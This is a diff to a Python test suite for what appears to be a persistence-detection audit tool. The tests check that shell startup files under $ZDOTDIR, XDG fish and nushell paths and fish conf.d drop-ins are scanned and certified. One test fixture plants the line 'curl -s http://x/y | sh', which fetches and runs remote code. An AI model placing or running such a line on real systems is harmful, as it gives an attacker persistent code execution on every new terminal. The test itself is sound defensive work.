@@ -301,8 +301,8 @@ class TestTheDisclosureIsNeverAmputated(unittest.TestCase):
         if os.getuid() == 0:
             self.skipTest("root bypasses permission bits")
         locs = []
-        for name in coverage.mechanism._SHELL_RC_FILES:
-            p = d / name.replace("/", "_")
+        for name in sorted({p.name for p in coverage.mechanism.shell_rc_locations()}):
+            p = d / name
             p.mkdir()
             os.chmod(p, 0o000)
             locs.append((coverage._ANCHOR_LABEL, p))
@@ -331,12 +331,47 @@ class TestTheCertifiedSurfaceIsTheScannedSurface(unittest.TestCase):
     it absent while reading it — on a fish-only account, the difference between clean and exit 3."""
 
     def test_every_scanned_shell_startup_file_is_also_certified(self):
-        scanned = set(coverage.mechanism._SHELL_RC_FILES)
         with mock.patch.object(Path, "home", staticmethod(lambda: Path("/h"))):
-            certified = {str(p.relative_to("/h")) for label, p in coverage._must_verify_locations()
+            scanned = set(coverage.mechanism.shell_rc_locations())
+            certified = {p for label, p in coverage._must_verify_locations()
                          if label == coverage._ANCHOR_LABEL}
         self.assertEqual(scanned - certified, set(),
                          "scanned but never certified — the audit would report it absent")
+
+    def test_a_config_kept_outside_home_is_resolved_not_assumed(self):
+        # $ZDOTDIR, XDG fish/nushell, and fish's conf.d drop-in dir: layouts that deliberately keep
+        # $HOME clean, where a fetch-to-shell line runs on every new terminal.
+        home = Path("/h")
+        with mock.patch.dict(os.environ, {"ZDOTDIR": "/z", "XDG_CONFIG_HOME": "/x"}), \
+             mock.patch.object(Path, "home", staticmethod(lambda: home)):
+            found = {str(p) for p in coverage.mechanism.shell_rc_locations()}
+        self.assertIn("/z/.zshrc", found, "$ZDOTDIR is where zsh itself looks")
+        self.assertIn("/x/fish/config.fish", found)
+        self.assertIn("/x/fish/conf.d", found)
+        self.assertIn("/x/nushell/config.nu", found)
+        self.assertIn("/h/.bashrc", found, "bash rc files stay in $HOME")
+
+    def test_a_zdotdir_account_is_not_reported_as_having_nothing(self):
+        zdot = Path(tempfile.mkdtemp(prefix="cov-zdot-"))
+        home = Path(tempfile.mkdtemp(prefix="cov-zhome-"))
+        self.addCleanup(lambda: [__import__("shutil").rmtree(d, ignore_errors=True)
+                                 for d in (zdot, home)])
+        (zdot / ".zshrc").write_text("source $ZSH/oh-my-zsh.sh\n")
+        with mock.patch.dict(os.environ, {"ZDOTDIR": str(zdot)}), \
+             mock.patch.object(Path, "home", staticmethod(lambda: home)):
+            self.assertEqual([i.id for i in coverage.check_persistence_coverage()], [])
+
+    def test_a_conf_d_drop_in_is_read_for_a_planted_line(self):
+        home = Path(tempfile.mkdtemp(prefix="cov-confd-"))
+        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
+        confd = home / ".config" / "fish" / "conf.d"
+        confd.mkdir(parents=True)
+        (confd / "99-evil.fish").write_text("curl -s http://x/y | sh\n")
+        with mock.patch.dict(os.environ, {}, clear=False), \
+             mock.patch.object(Path, "home", staticmethod(lambda: home)):
+            os.environ.pop("XDG_CONFIG_HOME", None)
+            read = [p.name for p in coverage.mechanism._iter_shell_rc()]
+        self.assertIn("99-evil.fish", read, "a conf.d drop-in is sourced on every shell start")
 
     def test_a_fish_only_account_is_not_reported_as_having_nothing(self):
         home = Path(tempfile.mkdtemp(prefix="cov-fish-"))
